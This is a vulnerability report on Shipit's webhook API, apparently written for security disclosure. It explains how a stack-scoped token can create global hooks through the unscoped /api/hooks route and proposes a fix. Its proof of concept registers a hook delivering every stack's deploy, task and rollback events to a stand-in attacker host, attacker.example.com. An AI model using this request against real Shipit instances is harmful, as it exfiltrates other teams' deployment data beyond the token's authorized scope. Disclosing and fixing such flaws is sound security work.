## Title
Stack-scoped API token can create/modify a global webhook that leaks every stack's deploy/task events - (File: app/controllers/shipit/api/hooks_controller.rb)

### Summary
`Shipit::ApiClient` can be created with `stack: <a specific stack>`, meaning its authorization is meant to be confined to that single stack [1](#0-0) . `Shipit::Api::BaseController#stacks` correctly enforces this scope for most endpoints by restricting the queryable `Stack` relation to `current_api_client.stack_id` [2](#0-1) . However, `Shipit::Api::HooksController` derives the `Hook`'s `stack_id` purely from whether the `:stack_id` URL param is present, never consulting `current_api_client.stack_id` at all:

```ruby
def hooks
  Hook.where(stack_id:)
end

def stack_id
  stack.id if params[:stack_id].present?
end
``` [3](#0-2) 

Because the `HooksController` is mounted both nested under a stack (`/api/stacks/*stack_id/hooks`) and at the top level with no stack segment (`/api/hooks`) [4](#0-3) , a request to the unscoped `/api/hooks` route never populates `params[:stack_id]`, so `stack_id` resolves to `nil` regardless of the authenticated client's stack scope. `Hook.where(stack_id: nil).create(...)` then persists a **global** hook (Rails copies the relation's equality condition as the default attribute), and global hooks receive events for *every* stack, per `Hook.for_stack(stack_id) = where(stack_id: [nil, stack_id])` [5](#0-4) .

### Finding Description
The binding that should hold is: `stack scope authorized for the ApiClient token == stack(s) whose Hook records the token can read/write`. `HooksController` breaks this equality because it determines the target `stack_id` solely from the URL shape, not from `current_api_client.stack_id`:

- Before the attack: an org admin issues a stack-scoped `ApiClient` (e.g. `stack: shipit`) with `read:hook`/`write:hook` permissions, intending it to manage webhooks only for that one stack, exactly as the nested route `/api/stacks/shipit/hooks` implies.
- After the attack: the same token is used against the top-level route `/api/hooks` (which maps to the identical controller/action, confirmed by the routing priority test [6](#0-5) ). Here `stack_id` is `nil`, so `hooks` becomes `Hook.where(stack_id: nil)` — the **global hooks** collection, which is delivered on every event for every stack in the installation. `require_permission` only checks the coarse `write:hook`/`read:hook` permission bit, not `current_api_client.stack_id` [7](#0-6) .

This means the "stack a token authorizes" (single stack) and "stack(s) the write actually touches" (all stacks, via a global hook) diverge — exactly the class of binding violation described in the analog report, where a value that should be tied to a fixed/verified scope is instead derived from mutable/attacker-influenced context.

### Impact Explanation
With a `write:hook`-permitted, single-stack-scoped `ApiClient` token, an attacker can:
1. `POST /api/hooks` with an attacker-controlled `delivery_url` and broad `events` (e.g. `deploy`, `task`, `rollback`, `commit_status`, `merge_status`) to create a global hook. That hook will subsequently receive the full event payloads (built via `Hook.coerce_payload`, which serializes stacks/commits/tasks) for **every stack** in the Shipit instance, not just the stack the token is authorized for [8](#0-7) .
2. `PATCH/DELETE /api/hooks/:id` to modify or destroy any existing global hook (e.g. redirect an admin-configured global integration to an attacker endpoint), again independent of the token's stack scope.

This constitutes unauthorized cross-stack read of deploy/task state and output links (task permalinks, commit SHAs, statuses) for stacks the token was never granted access to — matching the High-impact category "unauthenticated read of stack state, task streams or deploy output" achieved via escalation beyond the token's authorized scope.

### Likelihood Explanation
Any holder of a legitimately-issued, stack-scoped `ApiClient` credential with `write:hook` (a normal, documented permission a repo owner might grant to a CI integration for their own stack) can trivially trigger this by simply calling the unscoped `/api/hooks` endpoint instead of the nested one — no additional privilege, secret, or session is required beyond the token itself.

### Recommendation
In `Shipit::Api::HooksController`, always intersect the resolved `stack_id` with `current_api_client.stack_id` when the client is stack-scoped, and reject requests to the unscoped `/api/hooks` endpoints (or force `stack_id` to the client's own stack) whenever `current_api_client.stack_id?` is true, mirroring the scoping logic already used in `BaseController#stacks`.

### Proof of Concept
1. As an admin, create an `ApiClient` scoped to stack `acme/repo/production` with permission `write:hook` (via `ApiClient.create!(creator:, name:, stack: acme_stack, permissions: ['write:hook'])`, exposed through `/api_clients` UI) [1](#0-0) .
2. Using that token's Basic-Auth credentials, send:
```
POST /api/hooks
delivery_url=https://attacker.example.com/collect
events[]=deploy
events[]=task
events[]=rollback
```
3. Because the request hits the top-level route, `stack_id` evaluates to `nil` [9](#0-8) , and `Hook.where(stack_id: nil).create(params)` persists a global `Hook`.
4. From then on, every deploy/task/rollback event for **every** stack in the Shipit instance is POSTed with its full serialized payload to `https://attacker.example.com/collect`, even though the token was only ever authorized for one stack.

    scope :global, -> { where(stack_id: nil) }
    scope :scoped_to, ->(stack) { where(stack_id: stack.id) }
    scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
